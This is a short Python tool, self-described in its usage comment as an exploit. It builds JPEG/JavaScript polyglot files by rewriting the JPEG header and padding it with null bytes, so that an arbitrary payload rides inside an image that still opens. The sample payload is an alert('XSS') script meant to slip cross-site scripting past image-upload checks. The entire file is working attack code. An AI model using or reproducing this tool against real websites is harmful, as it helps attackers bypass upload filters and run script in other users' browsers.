#!/usr/bin/env python3
import argparse

#modo de uso python3 exploit.py -i test.jpeg -o injected.jpeg -pr '*/=alert("XSS")/*'
def inject(infile: str, outfile: str, payload: bytes) -> None:
    try:
        a = open(infile, 'rb').read()
    except FileNotFoundError:
        print(f"[!] File '{infile}' does not exist.")
        exit(1)
    header_size = int(a.hex()[8:12], 16)
    new_header_size = int(payload.hex()[2:4]+payload.hex()[:2], 16)
    null_count = new_header_size - header_size - 16
    start = a[:40]
    end = a.hex()[40:]
    end = bytearray([int(end[i:i+2], 16) for i in range(0, len(end), 2)])
    res = start + (null_count * b"\x00") + payload + end

    with open(outfile, 'wb') as of:
        of.write(res)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("-pf", "--payload-file",
                    help="Path to text file with payload")
    ap.add_argument("-pr", "--payload-read", help="Payload")
    ap.add_argument("-i", "--input", help="Input file (JPEG)", required=True)
    ap.add_argument("-o", "--output", help="Output file (JPEG)", required=True)
    args = ap.parse_args()

    if args.payload_file:
        try:
            payload = open(args.payload_file, 'rb').read()
        except FileNotFoundError:
            print(f"[!] File '{args.payload_file}' does not exist.")
            exit(1)
    elif args.payload_read:
        payload = args.payload_read.encode()
    else:
        print("[!] One of -pf or -pr needed")
        exit(1)

    inject(args.input, args.output, payload)

if __name__ == "__main__":
    main()
